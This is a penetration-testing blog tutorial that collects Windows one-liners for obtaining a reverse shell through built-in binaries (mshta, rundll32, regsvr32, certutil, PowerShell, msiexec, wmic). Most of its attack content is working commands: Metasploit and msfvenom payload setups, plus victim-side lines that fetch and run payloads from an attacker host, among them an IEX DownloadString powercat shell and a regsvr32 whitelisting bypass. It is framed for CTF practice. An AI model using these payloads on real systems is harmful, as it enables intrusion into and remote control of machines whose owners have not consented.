<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Get Reverse-shell via Windows one-liner</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="bookmark"><time class="entry-date published updated" datetime="2019-01-20T13:30:38+00:00">January 20, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article will help those who play with CTF challenges because today we will discuss “Windows One-Liner” to use malicious commands such as PowerShell or rundll32 to get the reverse shell of the Windows system. Generally, while abusing HTTP services or other programs, we get RCE vulnerability. This loophole allows you to remotely execute any system command. We have therefore prepared a list of Windows commands that enable you to use the target machine to get reverse connections.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Mshta.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch HTA attack via HTA Web Server of Metasploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Rundll32.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch Rundll32 Attack via SMB Delivery of Metasploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Regsvr32.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch Regsvr32 via Script Web Delivery of Metasploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Certutil.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch MSbuild Attack via Msfvenom C# shellcode</span></li>
</ul>
<p><span style="color: #000000;"><strong>Powershell.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch Powercat attack via Powershell</span></li>
<li><span style="color: #000000;">Launch cscript.exe via Powershell</span></li>
<li><span style="color: #000000;">Launch Batch File Attack via Powershell</span></li>
</ul>
<p><span style="color: #000000;"><strong>Msiexec.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch msiexec attack via msfvenom</span></li>
</ul>
<p><span style="color: #000000;"><strong>Wmic.exe</strong></span></p>
<ul>
<li><span style="color: #000000;">Launch Wmic.exe attack via Koadic</span></li>
</ul>
<h3><span style="color: #800000;">Mshta.exe </span></h3>
<p><span style="color: #000000;">Mshta.exe runs the Microsoft HTML Application Host, the Windows OS utility responsible for running <strong>HTA</strong>( HTML Application) files. HTML files that we can run JavaScript or VBScript with. You can interpret these files using the Microsoft MSHTA.exe tool.</span></p>
<p><span style="color: #000000;">Metasploit contain the “HTA Web Server” module which generates malicious hta file. This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell. When a user navigates to the HTA file they will be prompted by IE twice before the payload is executed.</span></p>
<pre class="lang:default decode:true">use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) &gt; exploit</pre>
<p><span style="color: #000000;">Now run the malicious code through mshta.exe on the victim’s machine (vulnerable to RCE) to obtain meterpreter sessions.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vRQoGXf6Hxc/XERxDCNVrRI/AAAAAAAAcIA/-HNjlqYKAjQpdD2BUOGPCfcE3-Qn1RfwwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Once you will execute the malicious hta file on the remote machine with the help of mshta.exe, you get the reverse connection at your local machine (Kali Linux).</span></p>
<pre class="lang:default decode:true">mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WojuVBITUBA/XERxFcLMnDI/AAAAAAAAcIc/VIRbJgR_0KMAonf3QaFGRwgJ9zF2xFgjQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we have the meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LxXWG6Wp9tA/XERxHkuPN8I/AAAAAAAAcI8/-Cs5h6XR0jg1nqOG_qg7NH0LcJo1wJ2lwCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Rundll32.exe</span></h3>
<p><span style="color: #000000;">Rundll32.exe is associated with Windows Operating System that allows you to invoke a function exported from a <strong>DLL</strong>, either 16-bit or 32-bit and store it in proper memory libraries.</span></p>
<p><span style="color: #000000;"><strong>Launch Rundll32 Attack via SMB Delivery of Metasploit</strong></span></p>
<p><span style="color: #000000;">Metasploit also contain the “SMB Delivery” module which generates malicious dll file. This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.</span></p>
<pre class="lang:default decode:true">use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) &gt; exploit</pre>
<p><span style="color: #000000;">Now run the malicious code through rundll32.exe on the victim machine (vulnerable to RCE) to obtain meterpreter sessions.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-9RiWJSgc9kc/XERxKTU-01I/AAAAAAAAcJo/8zVtmo3pB_oHEiS2jutBghqlEEMFGZvpwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Once you will execute the dll file on the remote machine with the help of rundll32.exe, you will get the reverse connection at your local machine (Kali Linux).</span></p>
<pre class="lang:default decode:true">rundll32.exe \\192.168.1.109\vabFG\test.dll,0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DoAZZYKv1GY/XERxDGuR4DI/AAAAAAAAcIE/ajlIITUcoZw9M4H6AtJz34kvNUo9YYFfQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we have the meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3C7oXVJUYzk/XERxDXzYtCI/AAAAAAAAcII/V1mhJdqQq7IUHP0uWAoYd46qmWk-2uIyQCLcBGAs/s1600/11.png"/></span></p>
<h3><span style="color: #800000;">Regsvr32.exe</span></h3>
<p><span style="color: #000000;">Regsvr32 is a command-line utility to register and unregister OLE controls, such as <strong>DLLs</strong> and ActiveX controls in the Windows Registry. Regsvr32.exe is installed in the %systemroot%\System32 folder in Windows XP and later versions of Windows.</span></p>
<p><span style="color: #000000;">RegSvr32.exe has the following command-line options:</span></p>
<p><span style="color: #000000;"><em>Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] &lt;dllname&gt;</em></span></p>
<p><span style="color: #000000;">/u – Unregister server</span><br/>
<span style="color: #000000;">/i – Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls dll to uninstall</span><br/>
<span style="color: #000000;">/n – do not call DllRegisterServer; this option must be used with /i</span><br/>
<span style="color: #000000;">/s – Silent; display no message boxes</span></p>
<p><span style="color: #000000;"><strong>Launch Regsvr32 via Script Web Delivery of Metasploit</strong></span></p>
<p><span style="color: #000000;">This module quickly fires up a web server that serves a payload. The provided command which will allow for a payload to download and execute. It will do it either specified scripting language interpreter or “squiblydoo” via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection.</span></p>
<p><span style="color: #000000;">Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request a .sct file and then execute the included PowerShell command inside of it. Both web requests (i.e., the<strong> .sct file and PowerShell</strong> download/execute) can occur on the same port. “PSH (Binary)” will write a file to the disk, allowing for custom binaries to be served up to be downloaded/executed.</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 3
msf exploit (web_delivery)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt; set lhost 192.168.1.109
msf exploit (web_delivery)&gt;set srvhost 192.168.1.109
msf exploit (web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;">Copy the highlighted text shown in below window</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-p0QEInqkcx8/XERxEfHkFXI/AAAAAAAAcIM/f6J6-fwsWCMa-4fCq5uiLAHZB3gCF-9bgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Once you will execute the scrobj.dll file on the remote machine with the help of regsrv32.exe, you will get the reverse connection at your local machine (Kali Linux).</span></p>
<pre class="lang:default decode:true">regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OB5nghnOldk/XERxEnRo8GI/AAAAAAAAcIU/2wefsko02AElgdWTQJZeWLjo3cYUFhBLQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we have the meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_ix5g4_sjyQ/XERxEQYpoyI/AAAAAAAAcIQ/Xu9F9xQFugMGM0-dTZHfqbR9szpv6K3fgCLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #800000;">Certutil.exe</span></h3>
<p><span style="color: #000000;">Certutil.exe is a command-line program that is installed as part of Certificate Services. We can use this tool to execute our malicious <strong>exe file</strong> in the target machine to get a meterpreter session.</span></p>
<p><span style="color: #000000;"><strong>Launch certutil Attack via Msfvenom</strong></span></p>
<p><span style="color: #000000;">Generate a malicious executable (.exe) file with msfvenom and <strong>start multi/handler</strong> to get the reverse shell of the victim’s machine.</span></p>
<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-u4xQqtgWTyY/XERxE1CnEoI/AAAAAAAAcIY/gbDs9afuMVEdYu4CmTBD1dFAVV0X5WXWgCLcBGAs/s1600/19.png"/></strong></span></p>
<p><span style="color: #000000;">Now, to dump configuration information or shell.exe file files with certutil. you can follow below syntax:</span></p>
<p><span style="color: #000000;"><em>Syntax: [-f] [-urlcache] [-split] Path of executable file</em></span></p>
<pre class="lang:default decode:true">certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe &amp; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bDtjVsVqCfI/XERxFnef2HI/AAAAAAAAcIg/2lWy09_8hCUan9rgSBKoSPXf98Dq4uCwwCLcBGAs/s1600/20.png"/></span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">As you can observe, we have a meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-kzB3IOsqd7E/XERxFqRFN-I/AAAAAAAAcIk/EGkn94fq-WsFUDnMc3K3981c0psvCnYowCLcBGAs/s1600/21.png"/></span></p>
<h3><span style="color: #800000;">Powershell.exe</span></h3>
<p><span style="color: #000000;">You can use PowerShell.exe to start a PowerShell session from the command line of another tool, such as Cmd.exe, or use it at the PowerShell command line to start a new session. Read more from the official website of Microsoft Windows from <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://docs.microsoft.com/en-us/powershell/">here</a></span>.</span></p>
<p><span style="color: #000000;"><strong>Launch Powercat attack via Powershell</strong></span></p>
<p><span style="color: #000000;">Powercat is a PowerShell native backdoor listener and reverse shell also known as modifying version of netcat because it has integrated support for the generation of encoded payloads, which msfvenom would do and also has a client- to- client relay, a term for Powercat client that allows two separate listeners to be connected.</span></p>
<p><span style="color: #000000;">Download PowerShell in your local machine and then the powercat.ps1 transfer files with python HTTP server to obtain reverse shell of the target as shown below and <strong>start netcat listener</strong>.</span></p>
<pre class="lang:default decode:true">git clone https://github.com/besimorhino/powercat.git
python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-w3C510CQUwc/XERxGDKDzWI/AAAAAAAAcIo/t7-aghYUo7EMgY6zJp71jfELNm85oIhXgCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Then execute the following command on the remote side to get netcat session.</span></p>
<pre class="lang:default decode:true">powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AuWS47ZUX7M/XERxGKIaPjI/AAAAAAAAcIw/t2eKFIIM9Go94YdhULnl25q0ESt8k5bjwCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we have netcat session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pUe8murtpZ8/XERxGFr0IdI/AAAAAAAAcIs/DE_vK8GP4kYQUGTVRsYeQL7f7UP54Z9vwCLcBGAs/s1600/26.png"/></span></p>
<h3><span style="color: #800000;"><strong>Batch File</strong></span></h3>
<p><span style="color: #000000;">Similarly, PowerShell allows the client to execute <strong>bat file</strong>, therefore let’s generate the malicious batch file with msfvenom as given below and start netcat listener.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 &gt; 1.bat</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OdUOi3cMRQs/XERxGnqbssI/AAAAAAAAcI0/SEKI54JsGeYJXEibvsA_6tlJh0k5qiDFwCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Then execute the following command on the remote side to get netcat session.</span></p>
<pre class="lang:default decode:true ">powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0CmovKHOJrM/XERxHCRIPnI/AAAAAAAAcI4/ObUMBfxp2uk-erbTVLlt3Dw9XuzTBBkCACLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we have netcat session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4Mnl67YAD6s/XERxH_3GZjI/AAAAAAAAcJA/Uvop5v5QilMx_yYqc65rFYT7oVLhg5uvgCLcBGAs/s1600/29.png"/></span></p>
<h3><span style="color: #800000;"><strong>Cscript</strong></span></h3>
<p><span style="color: #000000;">Similarly, PowerShell allows the client to execute <strong>cscript.exe</strong> to run <strong>wsf, js</strong> and <strong>vbscript</strong>, therefore let’s generate malicious bat file with msfvenom as given below and start multi/handler as the listener.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs &gt; 1.vbs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pBOo1dseDgE/XERxH0We7tI/AAAAAAAAcJE/5RCKtv1aKGAfV7zFzqYUY1Xjh61G7ALbwCLcBGAs/s1600/30.1.png"/></span></p>
<p><span style="color: #000000;">Then execute the following command on the remote side to get a meterpreter session.</span></p>
<pre class="lang:default decode:true">powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PvnGPj2GVGA/XERxIFksOFI/AAAAAAAAcJI/4yLhVGVqkvg_pnQgLq0fKjejrLkjpF_jgCLcBGAs/s1600/30.2.png"/></span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">As you can observe, we have meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-aymk9tuvy9g/XERxImvP91I/AAAAAAAAcJM/De-FehRxf4s7irNF2M7VFA8m8Am1KJxrgCLcBGAs/s1600/30.3.png"/></span></p>
<h3><span style="color: #800000;">Msiexec.exe</span></h3>
<p><span style="color: #000000;">As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by <strong>MSI packages</strong> for the installation of applications. The executable program that interprets packages and installs products is Msiexec.exe.  </span></p>
<p><span style="color: #000000;"><strong>Launch msiexec attack via msfvenom</strong></span></p>
<p><span style="color: #000000;">Let’s generate an MSI Package file (1.msi) utilizing the Windows Meterpreter payload as follows and start multi/handler as the listener.</span></p>
<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi &gt; 1.msi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vGSOtlKLyf8/XERxIg5stDI/AAAAAAAAcJU/v6tyxgZArS4nnRoEPCUeyU1Nq3kRug3ZgCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Once you will execute the 1.msi file on the remote machine with the help of msiexec, you will get the reverse connection at your local machine (Kali Linux).</span></p>
<pre class="lang:default decode:true">msiexec /q /i http://192.168.1.109/1.msi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8GkhktI-SyM/XERxIgj3uCI/AAAAAAAAcJQ/rRqB1uqd1DYLxa8iC7Gb-wOeqmdt1Jx4wCLcBGAs/s1600/31.png"/></span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">As you can observe, we have meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q9pZ_B32-vQ/XERxI4lTSlI/AAAAAAAAcJY/Tb_i1u2XXBUFsmhQJlP_KIcIMK2Hl9OBgCLcBGAs/s1600/32.png"/></span></p>
<h3><span style="color: #800000;">Wmic.exe</span></h3>
<p><span style="color: #000000;">The WMIC utility is a Microsoft tool provides a WMI command-line interface that is used for a variety of administrative functions for local and remote machine and also used to wmic query such as system settings, stop processes and execute scripts locally or remotely. Therefore, it can invoke<strong> XSL script</strong> (eXtensible Stylesheet Language).</span></p>
<p><span style="color: #000000;"><strong>Launch Wmic.exe attack via Koadic </strong></span></p>
<p><span style="color: #000000;">Now will generate a malicious XSL file with the help of koadic which is a Command &amp; Control tool which is quite similar to Metasploit and Powershell Empire.</span></p>
<p><span style="color: #000000;">To know how koadic works, read our article from here<em>: <span style="color: #3366ff;">https://www.hackingarticles.in/koadic-com-command-control-framework/</span></em></span></p>
<p><span style="color: #000000;">Once installation gets completed, you can run <strong>./koadic</strong> file to start koadic and start with loading the stager/js/wmic stager by running the following command and set SRVHOST where the stager should call home.</span></p>
<pre class="lang:default decode:true">use stager/js/wmic
set SRVHOST 192.168.1.107
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Vr3Ajw9K7VE/XERxJ51_aTI/AAAAAAAAcJg/yjMRQ_m7kDM3-eb4F30bjGCmUYRNnMnjQCLcBGAs/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Execute WMIC following command to download and run the malicious XSL file from a remote server:</span></p>
<pre class="lang:default decode:true">wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-128j7cQgiIw/XERxJrwmPDI/AAAAAAAAcJc/E6fOncwHWFkqByePbnTMoWstqBamuaL3wCLcBGAs/s1600/37.png"/></span></p>
<p><span style="color: #000000;">Once the malicious XSL file will get executed on the target machine, you will have a <strong>Zombie connection</strong> just like Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-L7nvBm5Sd48/XERxKDpMKhI/AAAAAAAAcJk/R8u8I_loOnkqUvRf1pqXZ3K6ZRxv2O90wCLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
